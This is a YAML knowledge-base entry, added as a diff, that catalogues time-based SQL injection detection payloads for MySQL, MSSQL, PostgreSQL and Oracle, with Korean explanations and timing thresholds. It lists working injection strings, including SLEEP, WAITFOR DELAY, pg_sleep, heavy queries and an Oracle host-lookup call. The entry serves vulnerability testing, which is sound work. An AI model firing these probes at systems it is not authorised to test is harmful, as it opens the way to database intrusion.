@@ -1,0 +1,154 @@
+# GR-SEC-INS-P0003: Time-based Detection Payload
+
+identity:
+  id: GR-SEC-INS-P0003
+  name: "Time-based SLEEP Detection Payload"
+  normalization:
+    normalized_name: "time based sleep detection payload"
+    normalization_version: "1.0"
+  aliases:
+    - "SLEEP Test"
+    - "Time Delay Probe"
+    - "Timing Attack Payload"
+
+classification:
+  domain: security
+  type: payload
+  abstraction_level: 1
+  gr_coordinates:
+    layer: "L7"
+    zone: "Zone3"
+    tags:
+      - "S-VUL-INJ"
+      - "D-DB-SQL"
+      - "T-DETECT"
+
+definition:
+  what: |
+    시간 지연 함수(SLEEP, WAITFOR 등)를 사용하여
+    SQL Injection 취약점을 탐지하는 페이로드이다.
+    응답 시간 차이로 취약점 존재를 확인한다.
+  why: |
+    에러 메시지와 응답 내용 차이 모두 없어도
+    시간 지연만으로 SQLi 존재를 확인할 수 있다.
+    가장 제한된 환경에서도 동작하는 탐지 방법이다.
+
+payload:
+  mysql:
+    raw: "' AND SLEEP(5)--"
+    variations:
+      - "' AND SLEEP(5)--"
+      - "' AND SLEEP(5)#"
+      - "' OR SLEEP(5)--"
+      - "' AND IF(1=1,SLEEP(5),0)--"
+      - "' AND (SELECT SLEEP(5))--"
+      - "1' AND SLEEP(5) AND '1'='1"
+    benchmark_alternative: "' AND BENCHMARK(10000000,SHA1('test'))--"
+  mssql:
+    raw: "'; WAITFOR DELAY '0:0:5'--"
+    variations:
+      - "'; WAITFOR DELAY '0:0:5'--"
+      - "' WAITFOR DELAY '0:0:5'--"
+      - "'; IF (1=1) WAITFOR DELAY '0:0:5'--"
+  postgresql:
+    raw: "'; SELECT pg_sleep(5)--"
+    variations:
+      - "'; SELECT pg_sleep(5)--"
+      - "' AND pg_sleep(5)--"
+      - "' || pg_sleep(5)--"
+  oracle:
+    raw: "' AND DBMS_LOCK.SLEEP(5)--"
+    variations:
+      - "' AND DBMS_LOCK.SLEEP(5)--"
+      - "' AND UTL_INADDR.get_host_name('10.0.0.1')--"
+    heavy_query: |
+      ' AND (SELECT COUNT(*) FROM ALL_USERS t1,
+      ALL_USERS t2, ALL_USERS t3) > 0--
+
+detection:
+  method: timing_analysis
+  baseline_required: true
+  indicators:
+    delay_threshold: 4500  # ms (allow 500ms variance)
+    multiple_tests: 3
+    variance_tolerance: 1000  # ms
+  confirmation:
+    - condition: "avg_delay >= expected_delay - tolerance"
+      confidence: 0.9
+    - condition: "consistent_across_tests"
+      confidence: 0.95
+
+relations:
+  structural:
+    instance_of:
+      - GR-SEC-TEC-00003  # Time-based SQLi
+  conditional:
+    preceded_by:
+      - GR-SEC-INS-P0001  # Quote test (no error)
+      - GR-SEC-INS-P0002  # Boolean test (no difference)
+    fallback_for:
+      - GR-SEC-INS-P0002  # When Boolean fails
+
+constraints:
+  - property: effectiveness
+    base_value: 0.8
+    conditions:
+      - when:
+          context_type: network
+          condition: "high_latency_network == true"
+        then:
+          value: 0.5
+          reason: "네트워크 지연이 크면 측정 정확도 저하"
+      - when:
+          context_type: configuration
+          condition: "sleep_disabled == true"
+        then:
+          value: 0.3
+          reason: "SLEEP 비활성화 시 heavy query로 대체"
+
+properties:
+  security:
+    severity: info
+    purpose: detection
+    false_positive_rate: very_low
+    requires_baseline: true
+    dbms_specific: true
+    network_sensitive: true
+
+metadata:
+  trust:
+    source: research
+    confidence: 1.0
+    verified:
+      status: verified
+      date: "2025-01-26"
+      by: "security-research"
+  temporal:
+    created: "2025-01-26"
+    modified: "2025-01-26"
+    revision: 1
+  lineage:
+    ingested_from:
+      source_type: manual
+      source_uri: "internal://gr-sqli-payloads"
+      ingestion_date: "2025-01-26"
+      ingestion_method: "expert_authoring"
+    transformations: []
+  security:
+    sensitivity: public
+    weaponization_risk: low
+  ai:
+    embedding_text: |
+      Time-based SLEEP Detection Payload는 시간 지연
+      함수로 SQLi를 탐지하는 페이로드이다. MySQL SLEEP(),
+      MSSQL WAITFOR DELAY, PostgreSQL pg_sleep() 등을
+      사용한다. 응답 시간 차이로 취약점을 확인하며,
+      에러나 내용 차이 없이도 동작하는 최후의 수단이다.
+      네트워크 지연에 민감하여 베이스라인 측정이 필요하다.
+    search_keywords:
+      - "SLEEP"
+      - "WAITFOR DELAY"
+      - "pg_sleep"
+      - "time-based"
+      - "timing attack"
+      - "delay test"
